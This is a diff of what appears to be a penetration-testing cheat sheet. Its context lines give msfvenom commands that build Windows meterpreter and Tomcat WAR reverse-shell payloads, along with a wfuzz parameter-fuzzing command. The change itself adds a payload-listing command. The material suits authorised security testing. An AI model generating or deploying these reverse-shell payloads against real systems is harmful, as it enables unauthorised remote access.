@@ -4,6 +4,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe
 # msfvenom generate java tcp reverse shell with file format war for tomcat deployment
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war
 
+# msfvenom list available payloads
+msfvenom -l payloads
+
 # wfuzz fuzz a get parameter with; -f out file; --hw hide response with word count; --hh hide response with character count; --hc <code> hide responsecode <code>
 wfuzz --hw <word-count> -f <out-file> -w <wordlist> 'https://target.url?param1=FUZZ&param2=42'
 
